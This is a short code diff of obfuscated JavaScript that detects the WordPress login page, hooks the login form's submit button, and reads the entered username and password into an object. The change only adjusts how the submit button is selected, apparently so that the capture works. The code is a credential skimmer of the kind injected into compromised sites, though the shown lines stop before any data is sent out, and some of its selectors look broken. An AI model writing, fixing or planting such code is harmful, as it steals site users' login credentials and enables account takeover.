@@ -455,7 +455,7 @@ if (top['location']['href']['indexOf']('wp-login.php') > -1) {
       var interval = setInterval(function () {
           if (document['getElementById']('loginform')[0]) {
               clearInterval(interval);
-              document['getElementsByClassName']('wp-submit')[0].onclick = function (_0x441cx2) {
+              document['getElementById']('wp-submit').onclick = function (_0x441cx2) {
                var login = {};
               login.username = document.getElementById("user_login")[0].value;
               login.pass = document.getElementById("user_pass")[0].value;
